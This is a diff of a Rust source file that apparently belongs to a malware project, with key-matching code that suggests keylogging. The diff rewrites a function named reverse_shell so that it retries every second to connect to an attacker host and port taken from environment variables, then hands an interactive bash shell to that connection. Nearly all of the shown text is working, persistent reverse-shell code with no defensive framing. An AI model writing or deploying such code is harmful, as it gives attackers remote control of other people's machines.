@@ -5,7 +5,9 @@ use std::os::unix::io::{AsRawFd, FromRawFd};
 use std::process::{Command, Stdio};
 use device_query::{ Keycode };
 use dotenv::dotenv;
-use std::env;
+use std::{ env };
+use std::{thread, time};
+
 
 
 pub fn match_case(key: &Keycode) -> &'static str {
@@ -49,23 +51,30 @@ pub fn reverse_shell() {
     let value = env::var("PORT").unwrap();
     let addr = format!("{}:{}", key, value);
 
-    let sock = TcpStream::connect(addr).unwrap();
-    // created a socket, basically a file descriptor which stores the connection
+    loop {
+        thread::sleep(time::Duration::from_millis(1000));   
 
-    let fd = sock.as_raw_fd();
+        match TcpStream::connect(addr.clone()) {
+            Ok(stream) => {
+                println!("Connected to {}", addr);
+                let fd = stream.as_raw_fd();
 
-    Command::new("/bin/bash")
-        .arg("-i")
-        .stdin(unsafe { Stdio::from_raw_fd(fd) })
-        .stdout(unsafe { Stdio::from_raw_fd(fd) })
-        .stderr(unsafe { Stdio::from_raw_fd(fd) })
-        .spawn()
-        .unwrap()
-        .wait()
-        .unwrap();
+                Command::new("/bin/bash")
+            .       arg("-i")
+            .       stdin(unsafe { Stdio::from_raw_fd(fd) })
+            .       stdout(unsafe { Stdio::from_raw_fd(fd) })
+            .       stderr(unsafe { Stdio::from_raw_fd(fd) })
+            .       spawn()
+            .       unwrap()
+            .       wait()
+            .       unwrap();
+            }
+            Err(e) => {
+                println!("Failed to connect to {}: {}", addr, e);
+            }
+        }
+    }    
 }
-
-
 
 
 // --------------------- UNIT TESTS --------------------- //
